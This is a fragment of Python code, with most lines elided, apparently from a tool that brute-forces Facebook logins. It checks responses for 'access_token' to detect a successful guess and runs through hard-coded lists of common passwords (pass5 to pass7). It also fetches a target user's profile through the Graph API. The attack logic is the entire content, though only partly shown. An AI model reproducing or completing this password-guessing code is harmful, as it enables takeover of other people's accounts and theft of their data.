								...
								if 'www.facebook.com' in q["error_msg"]:
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											#Pass5
											pass5 = "iloveyou","ihateyou","Bitcoin","EarnBitcoin","FreeBitcoin","Bitcointrader"
											...
											if 'access_token' in q:
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													#Pass6
													pass6 = "1q2w3e4r5t","Facebook","fuckyou","jesus","","lordjesus","myjesus","Happynewyear","HappyBirthday","Happybirthdaytome","enjoy1122","!@#$%^&*","lovely"
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															...
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+fb_token)
															b = json.loads(a.text)
															pass7 = "Welcome","password123","michael","Passw0rd","","Myprincess","princess","myloveismylife","trustno1","loveme","ilovemycountry"
